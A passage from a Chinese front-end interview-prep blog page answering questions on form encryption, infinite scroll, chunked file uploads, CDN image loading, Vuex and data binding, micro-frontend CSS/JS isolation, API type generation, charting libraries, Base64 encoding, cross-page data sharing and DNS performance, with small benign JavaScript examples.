<h3 id="3、表单加密解密"><a href="#3、表单加密解密" class="headerlink" title="3、表单加密解密"></a>3、表单加密解密</h3><p>表单加密和解密通常涉及敏感数据的处理，以确保数据在传输和存储时的安全性。以下是一些关于表单加密和解密的基本概念和流程：</p>
<p><strong>加密（Encryption）：</strong> 加密是将明文数据转换为密文数据的过程，以防止未经授权的访问。在Web表单中，通常使用加密来保护用户输入的敏感数据（例如密码、信用卡号等）。</p>
<p><strong>解密（Decryption）：</strong> 解密是将加密的密文数据还原为明文数据的过程，以便应用程序能够使用这些数据进行处理。</p>
<p>以下是一些常见的表单加密和解密的方式：</p>
<ol>
<li><p><strong>HTTPS：</strong> 对于大多数Web应用程序，最简单和最安全的方式是使用HTTPS协议。HTTPS使用加密技术来加密在浏览器和服务器之间传输的数据，包括表单数据。这确保了数据在传输过程中不会被拦截或窃听。</p>
</li>
<li><p><strong>前端加密（Client-Side Encryption）：</strong> 有时，可以在浏览器端对表单数据进行加密，然后再将加密后的数据传输到服务器。这可以使用JavaScript库来实现，例如CryptoJS。但请注意，前端加密通常不如HTTPS安全，因为密钥可能会在客户端暴露，容易受到攻击。</p>
</li>
<li><p><strong>服务器端加密（Server-Side Encryption）：</strong> 在服务器上对接收到的表单数据进行加密和解密是一种常见的方式。服务器负责处理敏感数据的加密和解密，并将数据存储在加密的状态下。</p>
</li>
<li><p><strong>加密算法：</strong> 选择合适的加密算法是关键。常见的加密算法包括AES（高级加密标准）、RSA（非对称加密）、SHA（安全哈希算法）等。选择算法应基于安全需求和性能要求。</p>
</li>
<li><p><strong>密钥管理：</strong> 管理加密密钥也非常重要。密钥应该定期轮换，并且只有授权的用户或服务能够访问密钥。</p>
</li>
<li><p><strong>数据完整性：</strong> 除了加密外，还应考虑数据的完整性。可以使用哈希函数来验证数据在传输过程中是否被篡改。</p>
</li>
</ol>
<p>请注意，加密和解密是复杂的过程，需要谨慎处理。为了确保数据的安全性，建议咨询安全专家并遵循最佳实践。此外，了解法律法规（例如GDPR）和行业标准也对处理敏感数据至关重要。最终，安全性应该成为整个应用程序设计和开发的核心原则。</p>
<h3 id="4、上拉加载原理"><a href="#4、上拉加载原理" class="headerlink" title="4、上拉加载原理"></a>4、上拉加载原理</h3><p>上拉加载（Infinite Scroll）是一种在Web页面上实现动态加载内容的技术，通常用于处理大量数据或分页显示内容。其原理涉及到滚动事件和异步加载数据。以下是上拉加载的基本原理：</p>
<ol>
<li><p><strong>检测滚动事件：</strong> 上拉加载的第一步是检测用户是否已经滚动到页面底部。这通常通过监听滚动事件来实现。当用户滚动页面时，会触发滚动事件。</p>
</li>
<li><p><strong>计算滚动位置：</strong> 在滚动事件处理程序中，通过计算页面的滚动位置来确定用户是否已经接近页面底部。这可以使用JavaScript中的 <code>scrollTop</code> 和 <code>scrollHeight</code> 属性来完成。<code>scrollTop</code> 表示当前滚动的距离，<code>scrollHeight</code> 表示整个页面的高度。</p>
</li>
<li><p><strong>触发加载：</strong> 一旦滚动位置接近页面底部（例如，当 <code>scrollTop + 视口高度 &gt;= scrollHeight - 阈值</code> 时），触发异步加载数据的操作。阈值可以是一个预定义的像素值或百分比，用于确定何时触发加载。</p>
</li>
<li><p><strong>异步加载数据：</strong> 加载数据通常涉及向服务器发送请求，以获取更多内容。这可以使用AJAX、Fetch API、GraphQL或其他网络请求工具来完成。一旦数据加载完成，将其添加到页面上，以显示新的内容。</p>
</li>
<li><p><strong>更新滚动位置：</strong> 在加载新数据后，页面的高度可能会增加。因此，需要更新滚动位置的计算，以便在用户继续向下滚动时能够正确触发下一次加载。</p>
</li>
<li><p><strong>循环加载：</strong> 上述步骤将不断重复，用户可以持续滚动以加载更多数据，直到所有数据都被加载或达到某个限制条件。</p>
</li>
</ol>
<p>上拉加载的实现可以根据具体的应用和框架有所不同，但其核心原理是检测滚动事件，计算滚动位置，触发加载数据，然后更新滚动位置和显示新数据。这种技术有助于改善页面性能和用户体验，因为它允许在用户滚动时动态加载内容，而不需要一次性加载所有数据。</p>
<h3 id="5、大文件分片上传"><a href="#5、大文件分片上传" class="headerlink" title="5、大文件分片上传"></a>5、大文件分片上传</h3><p>大文件分片上传是一种将大文件拆分成多个小块（分片），然后逐个上传这些分片的方法。这种方法有助于提高文件上传的可靠性和效率，因为它允许在网络不稳定或上传中断的情况下，只需重新上传丢失或损坏的分片，而不需要重新上传整个大文件。以下是实现大文件分片上传的一般步骤：</p>
<ol>
<li><p><strong>分片：</strong> 将大文件分成固定大小的块（分片）。通常，每个分片的大小在1MB到10MB之间，这个大小可以根据需求进行调整。您可以使用工具或库来完成这个任务。</p>
</li>
<li><p><strong>上传分片：</strong> 逐个上传分片。可以使用常见的文件上传技术（如AJAX、Fetch API、axios等）来上传每个分片。服务器端需要接受并存储这些分片。</p>
</li>
<li><p><strong>管理分片：</strong> 在服务器端，您需要管理已经上传的分片，通常将它们存储在临时目录中。服务器还需要维护一个列表或数据库，用于跟踪哪些分片已经上传，哪些分片还需要上传。</p>
</li>
<li><p><strong>校验：</strong> 每次上传分片后，都需要对其进行校验，以确保分片的完整性。可以使用哈希算法（如MD5或SHA-256）计算分片的哈希值，并将其与客户端计算的哈希值进行比较，以验证分片的完整性。</p>
</li>
<li><p><strong>合并分片：</strong> 当所有分片都上传完毕并通过校验后，服务器端需要将这些分片合并成完整的文件。这可以通过将分片按照顺序连接起来来完成。</p>
</li>
<li><p><strong>清理：</strong> 最后，一旦大文件已经合并完成，可以删除服务器上的分片，释放存储空间。</p>
</li>
</ol>
<p>在实际应用中，您可能还需要考虑一些额外的因素，如断点续传（使用户能够在上传中断后恢复上传）、安全性（确保只有授权用户可以上传文件）、进度显示（向用户显示上传进度）等。</p>
<p>有许多库和框架可以帮助您实现大文件分片上传，例如：</p>
<ul>
<li><strong>Resumable.js：</strong> 一个用于实现断点续传和大文件上传的JavaScript库。</li>
<li><strong>Dropzone.js：</strong> 一个用于文件上传的库，可以轻松实现分片上传。</li>
<li><strong>Uppy：</strong> 一个现代的文件上传器，支持分片上传和断点续传。</li>
</ul>
<p>请根据您的项目需求和技术栈选择合适的工具和库来实现大文件分片上传。</p>
<h3 id="6、使用cdn是否有图片没来得及加载的情况，如何解决"><a href="#6、使用cdn是否有图片没来得及加载的情况，如何解决" class="headerlink" title="6、使用cdn是否有图片没来得及加载的情况，如何解决"></a>6、使用cdn是否有图片没来得及加载的情况，如何解决</h3><p>使用CDN（内容分发网络）通常可以提高静态资源（如图像、CSS、JavaScript等）的加载速度，因为CDN服务器通常分布在全球各地，能够更快地将资源提供给用户。但在某些情况下，由于网络问题或CDN配置问题，可能会出现图片未能及时加载的情况。以下是一些可能导致此问题的原因以及如何解决它们的方法：</p>
<ol>
<li><p><strong>CDN边缘节点问题：</strong> CDN提供商通常在全球各地拥有多个边缘节点，但某些节点可能会出现故障或延迟。这可能导致用户无法从离他们最近的节点加载资源。</p>
<p><strong>解决方法：</strong> 您可以尝试切换到不同的CDN提供商或与您的CDN提供商联系以报告问题。另外，选择一家可靠的全球CDN提供商通常可以降低这种情况的发生概率。</p>
</li>
<li><p><strong>DNS解析问题：</strong> 如果DNS解析速度较慢，可能会导致延迟加载。这是因为浏览器需要将域名解析为IP地址，然后才能请求资源。</p>
<p><strong>解决方法：</strong> 使用较快的DNS服务，或者使用DNS预取（DNS Prefetching）技术，将域名与资源关联起来，以加速DNS解析过程。</p>
</li>
<li><p><strong>资源大小问题：</strong> 如果图像文件太大，可能会导致加载时间过长，尤其是在慢速网络上。</p>
<p><strong>解决方法：</strong> 优化图像，减小文件大小，选择适当的图像格式，并使用图像压缩工具。还可以考虑使用图像的响应式版本，根据设备和屏幕尺寸提供适当大小的图像。</p>
</li>
<li><p><strong>CDN缓存问题：</strong> CDN通常会缓存静态资源以提高性能，但在某些情况下，缓存可能会导致旧版本的资源被提供给用户。</p>
<p><strong>解决方法：</strong> 在资源的URL中使用版本号或哈希值，以确保在更新资源时浏览器获取新版本。还可以配置CDN以减小缓存时间，以便更频繁地获取新资源。</p>
</li>
<li><p><strong>CDN就近路由问题：</strong> CDN可能会将用户路由到距离较远的边缘节点，而不是最近的节点，这可能会导致延迟加载。</p>
<p><strong>解决方法：</strong> 使用任播（Anycast）CDN，这种CDN会将用户路由到最近的边缘节点，以减少延迟。</p>
</li>
<li><p><strong>网络问题：</strong> 用户的网络连接可能会受到各种问题的影响，如网络拥塞、丢包等，这可能会导致资源加载失败或延迟。</p>
<p><strong>解决方法：</strong> 在这种情况下，很难在前端代码中解决问题。最好的做法是监控网络问题并与网络服务提供商联系。</p>
</li>
</ol>
<p>总之，使用CDN通常能够提高性能，但由于各种原因可能会导致图片未能及时加载。为了减少这种情况的发生，建议选择可靠的CDN提供商，优化资源大小，配置合适的缓存策略，并考虑与网络服务提供商合作以解决网络问题。</p>
<h3 id="7、视图层如何更改数据层"><a href="#7、视图层如何更改数据层" class="headerlink" title="7、视图层如何更改数据层"></a>7、视图层如何更改数据层</h3><p>在前端应用中，视图层如何更改数据层通常通过以下方式来实现：</p>
<ol>
<li><p><strong>用户交互事件：</strong> 用户在界面上的操作（如点击按钮、输入表单、拖拽元素等）会触发事件。这些事件通常与相应的事件处理函数关联，事件处理函数可以执行数据层的更改操作。</p>
<p>例如，通过点击按钮触发一个事件处理函数来改变数据：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// HTML</span><br>&lt;button id=<span class="hljs-string">&quot;changeDataButton&quot;</span>&gt;<span class="hljs-title class_">Change</span> <span class="hljs-title class_">Data</span>&lt;/button&gt;<br><br><span class="hljs-comment">// JavaScript</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;changeDataButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 在事件处理函数中更改数据层</span><br>  dataLayer.<span class="hljs-property">someValue</span> = newValue;<br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>异步请求：</strong> 前端应用通常需要与服务器进行数据交互，可以通过发起异步请求（如Ajax请求、Fetch API请求等）来获取或更改数据。一旦请求完成，可以更新数据层以反映新的数据。</p>
<p>例如，通过Fetch API获取数据并更新数据层：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 将新数据更新到数据层</span><br>    dataLayer.<span class="hljs-property">someData</span> = data;<br>  &#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>状态管理库：</strong> 在大型应用中，通常会使用状态管理库（如Vuex、Redux等）来管理应用的数据层。这些库提供了一种集中管理应用状态的方式，通过分发（dispatch）操作来更改状态，并在视图层中监听状态变化来更新界面。</p>
<p>例如，在Vue.js中使用Vuex来更改数据层：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 在组件中分发一个动作（action）来更改数据</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">&#x27;changeDataAction&#x27;</span>, newValue);<br><br><span class="hljs-comment">// 在组件中监听数据变化，以便更新视图</span><br><span class="hljs-attr">computed</span>: &#123;<br>  <span class="hljs-title function_">someData</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">state</span>.<span class="hljs-property">someData</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>双向数据绑定：</strong> 有些前端框架（如Vue.js）支持双向数据绑定，允许直接在视图层中更改数据，同时自动将更改反映到数据层。这样，当用户在输入框中输入文本时，数据层中的数据也会相应地更新。</p>
<p>例如，在Vue.js中使用双向数据绑定：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- HTML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;dataLayer.someValue&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript --&gt;</span><br>new Vue(&#123;<br>  data: &#123;<br>    dataLayer: &#123;<br>      someValue: &#x27;&#x27;<br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li>
</ol>
<p>总之，视图层如何更改数据层通常涉及用户交互事件、异步请求、状态管理库以及双向数据绑定等不同的方法。选择哪种方法取决于应用的需求和使用的前端框架或库。不过，无论哪种方式，保持数据和视图的一致性是前端开发的关键部分。</p>
<h3 id="8、微应用的场景"><a href="#8、微应用的场景" class="headerlink" title="8、微应用的场景"></a>8、微应用的场景</h3><p>微应用（Micro Frontends）是一种将前端单页面应用（SPA）或前端模块拆分成小块的架构模式，每个小块被称为一个微应用，它们可以独立开发、部署和维护。微应用的场景可以涵盖多个方面，以下是一些常见的微应用应用场景：</p>
<ol>
<li><p><strong>多团队协作开发：</strong> 微应用允许不同团队或开发者独立开发和维护各自的微应用，每个微应用可以使用不同的技术栈和框架。这有助于降低大型前端应用的复杂性，提高团队的独立性和效率。</p>
</li>
<li><p><strong>独立部署和升级：</strong> 微应用可以独立部署和升级，而不会影响其他微应用。这降低了部署和维护的风险，允许快速迭代和发布新功能。</p>
</li>
<li><p><strong>性能优化：</strong> 微应用可以按需加载，从而减少初始加载时间。每个微应用可以拥有自己的懒加载策略，只在需要时加载相关资源。这有助于提高应用的性能和用户体验。</p>
</li>
<li><p><strong>跨团队合作：</strong> 不同团队可以协作开发一个复杂的前端应用，每个团队负责一个或多个微应用，它们可以通过定义明确的接口和通信机制来集成和协同工作。</p>
</li>
<li><p><strong>独立运行和测试：</strong> 微应用可以在本地独立运行和测试，这有助于提高开发速度和质量。每个微应用可以拥有自己的测试套件和开发环境。</p>
</li>
<li><p><strong>模块化开发：</strong> 微应用可以更好地实现模块化开发，每个微应用可以表示一个独立的功能或业务模块。这有助于组织和管理复杂的前端代码。</p>
</li>
<li><p><strong>多框架兼容：</strong> 微应用架构允许不同微应用使用不同的前端框架或库，从而支持多种技术栈的混合使用。这允许团队根据项目需求选择最适合的工具。</p>
</li>
<li><p><strong>应用复用：</strong> 微应用可以在不同的应用中重用，从而提高开发效率。如果一个微应用在一个项目中已经被开发和测试，它可以轻松地在其他项目中引入和使用。</p>
</li>
</ol>
<p>总之，微应用架构适用于大型前端应用的复杂性和团队协作需求。它允许团队独立开发和维护各自的部分，并在整个应用中高效集成，从而提高了开发效率、可维护性和可扩展性。微应用的应用场景可以根据具体项目和组织需求而变化。</p>
<h5 id="微应用它的css-js-是如何做隔离的"><a href="#微应用它的css-js-是如何做隔离的" class="headerlink" title="微应用它的css js 是如何做隔离的"></a>微应用它的css js 是如何做隔离的</h5><p>微应用中的 CSS 和 JavaScript 隔离是确保不同微应用之间不会互相影响的重要部分。这种隔离通常通过以下方法来实现：</p>
<h5 id="CSS-隔离"><a href="#CSS-隔离" class="headerlink" title="CSS 隔离"></a>CSS 隔离</h5><ol>
<li><p><strong>命名空间（Namespace）：</strong> 每个微应用的 CSS 类名和选择器都应该具有独特的命名空间，以防止冲突。这可以通过为每个微应用的 CSS 类名添加前缀或命名空间来实现。</p>
</li>
<li><p><strong>CSS Modules 或 CSS-in-JS：</strong> 使用工具如 CSS Modules 或 CSS-in-JS 可以将 CSS 局部化，使其仅对当前微应用有效。这些工具可以为每个组件生成唯一的 CSS 类名，从而实现隔离。</p>
</li>
<li><p><strong>Shadow DOM：</strong> 如果使用 Web Components，每个组件的样式可以通过 Shadow DOM 进行封装，从而实现样式的隔离。Shadow DOM 会将组件内部的 CSS 作用域限制在组件内部，防止样式泄漏。</p>
</li>
</ol>
<h5 id="JavaScript-隔离"><a href="#JavaScript-隔离" class="headerlink" title="JavaScript 隔离"></a>JavaScript 隔离</h5><ol>
<li><p><strong>沙盒环境：</strong> 微应用可以在一个独立的 JavaScript 沙盒环境中运行，这意味着每个微应用的 JavaScript 代码都在自己的执行环境中运行，不会污染全局作用域。这可以通过使用 iframe 或 Web Workers 来实现。</p>
</li>
<li><p><strong>模块化加载：</strong> 使用模块化加载器（如 Webpack 或 SystemJS）可以确保每个微应用的 JavaScript 模块都是独立的，不会与其他微应用的模块发生冲突。这些工具还可以帮助管理依赖关系，防止冗余加载。</p>
</li>
<li><p><strong>消息通信：</strong> 微应用之间可以使用消息通信机制来进行通信，而不是直接共享变量或状态。这可以防止不同微应用之间的 JavaScript 冲突。</p>
</li>
</ol>
<p>总的来说，实现 CSS 和 JavaScript 隔离的方法包括使用命名空间、局部化的工具、Shadow DOM、沙盒环境、模块化加载器和消息通信。这些方法可以确保每个微应用在运行时都是相互隔离的，不会互相干扰。选择哪种方法取决于项目的具体需求和技术栈。</p>
<h3 id="9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？"><a href="#9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？" class="headerlink" title="9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？"></a>9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？</h3><p>将后端的接口类型自动转换成前端的类型通常涉及到数据格式的转换，以确保前后端之间的数据能够正确匹配。以下是一些可能的做法：</p>
<ol>
<li><p><strong>使用 TypeScript 或 Flow：</strong> 如果你的前端项目使用了 TypeScript 或 Flow 类型系统，你可以为后端接口定义对应的类型。这样，在接口调用时，类型检查工具可以帮助你检测数据类型不匹配的问题。</p>
</li>
<li><p><strong>自动生成类型定义：</strong> 使用工具（例如，swagger-codegen、OpenAPI Generator）自动生成前端所需的类型定义文件。这些工具可以根据后端的 API 规范生成前端的类型定义，包括接口、请求参数和响应数据的类型。</p>
</li>
<li><p><strong>手动定义适配器：</strong> 手动编写一个适配器函数或类，将后端返回的数据转换为前端所需的格式。这个适配器可以在前端接收到后端数据后进行转换。这种方法适用于后端返回的数据结构较为复杂或需要进行定制化处理的情况。</p>
</li>
<li><p><strong>使用响应拦截器：</strong> 如果你使用的是像 Axios 这样的 HTTP 客户端库，你可以使用响应拦截器来自动转换后端数据。在拦截器中，你可以检查后端响应的数据格式，并将其转换为前端所需的格式。</p>
</li>
<li><p><strong>使用自定义中间件：</strong> 如果你的前端应用使用了中间件（例如 Redux 中间件），你可以编写自定义中间件来处理后端数据的转换。这种方式允许你在数据进入前端应用之前进行转换。</p>
</li>
<li><p><strong>使用 GraphQL：</strong> 如果你的项目使用 GraphQL 作为前后端通信协议，GraphQL 查询语言本身具有强大的数据类型转换功能，前端可以明确请求所需的数据类型，后端会根据查询自动提供匹配的数据。</p>
</li>
<li><p><strong>数据校验和转换库：</strong> 使用数据校验和转换库，如 Yup、Joi 或 io-ts，来验证和转换接口数据。这些库可以帮助你定义数据的期望结构，并进行转换。</p>
</li>
</ol>
<p>具体选择哪种方法取决于项目的需求、技术栈以及开发团队的偏好。通常情况下，结合类型系统和自动生成工具可以提高前后端数据的匹配性，减少潜在的类型错误。同时，手动定义适配器或使用拦截器等方法也可以应对一些特殊情况。</p>
<h3 id="10、前端想要实现可视化图表展示有啥方式？"><a href="#10、前端想要实现可视化图表展示有啥方式？" class="headerlink" title="10、前端想要实现可视化图表展示有啥方式？"></a>10、前端想要实现可视化图表展示有啥方式？</h3><p>前端实现可视化图表展示有多种方式，具体选择哪种方式取决于项目的需求、技术栈和数据来源。以下是一些常见的前端可视化图表展示方式：</p>
<ol>
<li><p><strong>使用图表库：</strong> 最常见的方式是使用现有的图表库，这些库提供了各种类型的图表，如折线图、柱状图、饼图等，以及丰富的配置选项。一些流行的图表库包括：</p>
<ul>
<li><strong>Highcharts：</strong> Highcharts 是一个功能丰富且高度可定制的图表库，支持多种图表类型。</li>
<li><strong>Chart.js：</strong> Chart.js 是一个轻量级的图表库，适用于简单的图表需求。</li>
<li><strong>D3.js：</strong> D3.js 是一个强大的数据可视化库，提供了灵活的绘图工具和数据操作功能。</li>
</ul>
</li>
<li><p><strong>使用可视化工具：</strong> 有一些可视化工具允许你通过可视化界面来创建和定制图表，然后将生成的图表嵌入到前端应用中。一些可视化工具包括：</p>
<ul>
<li><strong>Tableau：</strong> Tableau 是一个强大的数据可视化工具，支持各种数据源和多种可视化选项。</li>
<li><strong>Google Charts：</strong> Google Charts 提供了一套易于使用的图表库，可以通过 JavaScript API 或配置选项进行定制。</li>
</ul>
</li>
<li><p><strong>使用前端框架和库：</strong> 许多前端框架和库提供了内置的图表组件或集成了流行的图表库，使图表的集成更加容易。例如，使用 React 可以使用库如 Recharts 或 Victory 来创建图表。</p>
</li>
<li><p><strong>自定义图表：</strong> 如果需要高度定制的图表，可以考虑自定义绘制图表。可以使用 HTML5 的 Canvas 或 SVG 来手动绘制图表，或者使用 D3.js 这样的工具库来帮助自定义绘制。</p>
</li>
<li><p><strong>数据可视化框架：</strong> 一些数据可视化框架（如 ECharts、Plotly、AmCharts）提供了现成的可视化组件，同时支持各种数据格式和交互特性。</p>
</li>
<li><p><strong>使用可视化组件库：</strong> 一些 UI 组件库（如 Ant Design、Element UI）提供了内置的图表组件，可以快速集成到项目中。</p>
</li>
<li><p><strong>数据可视化平台集成：</strong> 如果你的数据已经存储在数据可视化平台（如Power BI、Tableau、Looker）中，你可以考虑通过嵌入代码片段或API来将可视化报表集成到前端应用中。</p>
</li>
<li><p><strong>地图可视化：</strong> 如果需要展示地理信息数据，可以使用地图可视化库（如Leaflet、Mapbox、Google Maps API）来创建交互性地图。</p>
</li>
</ol>
<p>选择哪种方式取决于项目的要求和复杂性。对于简单的需求，使用现有的图表库可能是最快速和有效的方式。对于更复杂的需求，可能需要自定义绘制或集成更强大的可视化工具。无论如何，了解不同的可视化工具和库，以及它们的优缺点，可以帮助你做出明智的选择。</p>
<h3 id="11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗"><a href="#11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗" class="headerlink" title="11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗"></a>11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗</h3><p>将图片转为 Base64 格式上传的主要原因是将图片数据嵌入到文本中，以便通过文本传输，通常用于减少HTTP请求的数量、提高网页性能以及在某些情况下简化图片的处理和管理。Base64 编码是一种将二进制数据转换成文本数据的编码方式。</p>
<p>Base64 编码原理如下：</p>
<ol>
<li><p><strong>数据分块：</strong> 首先，将二进制数据分成固定大小的块（通常每 3 个字节为一块），如果数据的长度不是 3 的倍数，会在末尾填充 0。</p>
</li>
<li><p><strong>转换成十进制：</strong> 将每个块的二进制数据转换成十进制数值。</p>
</li>
<li><p><strong>Base64 编码：</strong> 将每个十进制数值转换成 Base64 字符。Base64 字符集包括 64 个字符，通常是 A-Z、a-z、0-9 和两个额外字符（通常是 ‘+’ 和 ‘&#x2F;‘）。</p>
</li>
<li><p><strong>填充字符：</strong> 如果原始数据长度不是 3 的倍数，会在末尾添加一个或两个 ‘&#x3D;’ 字符，以表示填充。</p>
</li>
</ol>
<p>由于 Base64 编码将二进制数据转换为文本数据，所以可以在文本协议中传输，例如在 HTML、CSS 或 JSON 中嵌入图片数据。这可以减少HTTP请求，特别是对于小图片而言，因为不需要单独请求图片文件。但需要注意的是，Base64 编码会增加数据大小约 1&#x2F;3，因为每 3 个字节的二进制数据编码成 4 个字符。</p>
<p>除了Base64，还有其他的方式来上传图片，例如：</p>
<ol>
<li><p><strong>直接上传二进制文件：</strong> 将图片作为二进制文件上传到服务器，不经过Base64编码。这是最常见的方式，适用于大型图片或需要后端进一步处理的情况。</p>
</li>
<li><p><strong>使用FormData：</strong> 使用 FormData 对象来上传二进制文件。这种方式可以在前端轻松构建包含文件上传的表单，并将文件以二进制形式传输到服务器。</p>
</li>
<li><p><strong>CDN上传：</strong> 使用内容分发网络（CDN）来存储和分发图片，然后通过URL引用图片。这是在前端开发中常见的做法，特别是对于大型图片或需要全球分发的情况。</p>
</li>
</ol>
<p>选择上传方式取决于具体需求和应用场景。Base64 编码适用于小图片或需要在文本协议中传输图片数据的情况，但对于大型图片或需要后端处理的情况，通常更适合使用其他方式上传图片。</p>
<h3 id="12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？"><a href="#12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？" class="headerlink" title="12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？"></a>12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？</h3><p>在前端中，有多种数据共享跨页面的方案，每种方案都有其适用的场景和实现方式。以下是一些常见的数据共享方案和它们的实现方式：</p>
<ol>
<li><p><strong>URL 参数：</strong> 可以通过 URL 参数将数据传递给不同的页面。这是一种简单的方式，适用于少量数据的共享。实现方式是在页面之间传递参数并解析 URL 中的参数。</p>
</li>
<li><p><strong>Cookies：</strong> 使用浏览器的 Cookie 来存储数据。Cookie 数据在同一域名下的不同页面之间共享。实现方式是设置 Cookie，并在不同页面中读取和更新 Cookie。</p>
</li>
<li><p><strong>LocalStorage 和 SessionStorage：</strong> 这两种 Web 存储方案可以用于在不同页面之间共享数据。它们分别具有长期和会话级别的数据存储能力。实现方式是使用 <code>localStorage</code> 或 <code>sessionStorage</code> API 存储和检索数据。</p>
</li>
<li><p><strong>IndexedDB：</strong> IndexedDB 是一个客户端数据库，可以用于存储大量结构化数据，并且可以在不同页面之间共享。实现方式是使用 IndexedDB API 执行数据库操作。</p>
</li>
<li><p><strong>Web Storage API：</strong> Web Storage API 是一个通用的 Web 存储方案，包括 LocalStorage 和 SessionStorage。可以使用 <code>localStorage</code> 或 <code>sessionStorage</code> 存储和共享数据。</p>
</li>
<li><p><strong>服务端存储：</strong> 如果需要在不同用户之间共享数据，可以将数据存储在服务端，并提供 API 供不同页面访问和更新数据。</p>
</li>
<li><p><strong>状态管理库：</strong> 使用状态管理库（如 Redux、Mobx、Vuex 等）可以在不同页面之间共享应用程序的状态。这些库通常将状态存储在一个全局的状态容器中，并提供了一种在不同组件和页面之间共享和同步状态的机制。</p>
</li>
<li><p><strong>WebSocket：</strong> WebSocket 可以用于实时数据共享，它允许不同页面建立实时通信连接，从而在页面之间传递数据。</p>
</li>
<li><p><strong>window 对象：</strong> 可以使用全局的 <code>window</code> 对象来存储和共享数据，但这种方式通常不是最佳实践，因为全局变量可能会导致命名冲突和安全风险。</p>
</li>
</ol>
<p>对于使用 <code>window</code> 对象来存储和共享数据，应该谨慎使用，避免全局变量的滥用，因为它可能导致不可预测的问题。更推荐使用上述其他方法中的一种，根据具体需求选择合适的方案。</p>
<h3 id="13、DNS解析如何提高效率"><a href="#13、DNS解析如何提高效率" class="headerlink" title="13、DNS解析如何提高效率"></a>13、DNS解析如何提高效率</h3><p>DNS（Domain Name System）解析是将域名转换为 IP 地址的过程，它在浏览器加载网页时起着关键作用。提高 DNS 解析的效率可以加速网页加载速度。以下是一些方法来提高 DNS 解析的效率：</p>
<ol>
<li><p><strong>使用快速的 DNS 服务器：</strong> 使用可靠且快速响应的 DNS 服务器，例如 Google Public DNS 或 Cloudflare DNS，可以减少 DNS 查询的响应时间。你可以在计算机或路由器设置中配置首选 DNS 服务器来切换到这些服务。</p>
</li>
<li><p><strong>DNS 缓存：</strong> 操作系统和浏览器通常会缓存 DNS 查询的结果，以便在将来的访问中重用。这可以减少对 DNS 服务器的频繁查询，提高性能。确保你的系统和浏览器开启了 DNS 缓存功能。</p>
</li>
<li><p><strong>DNS 预取：</strong> 现代浏览器通常会自动执行 DNS 预取，即在加载网页时提前解析页面中的链接，以便提高页面加载速度。确保你的网站配置正确，以允许浏览器执行 DNS 预取。</p>
</li>
<li><p><strong>减少域名解析次数：</strong> 网页中引用的域名越多，DNS 解析的次数就越多。尽量减少网页中的第三方资源或域名，以减少 DNS 查询的数量。</p>
</li>
<li><p><strong>DNS 查询并行：</strong> 现代浏览器通常支持并行执行多个 DNS 查询，以加速网页加载。确保你的浏览器设置中启用了 DNS 查询并行。</p>
</li>
<li><p><strong>DNS 负载均衡：</strong> 对于高流量网站，可以考虑将 DNS 查询分散到多个不同的 DNS 服务器上，以减轻单一 DNS 服务器的负载。</p>
</li>
<li><p><strong>TTL 调整：</strong> TTL（Time to Live）是 DNS 记录的生存时间，它指定了记录在缓存中的有效期。调整 TTL 设置可以控制 DNS 缓存的时效性，但需要权衡响应速度和缓存更新的频率。</p>
</li>
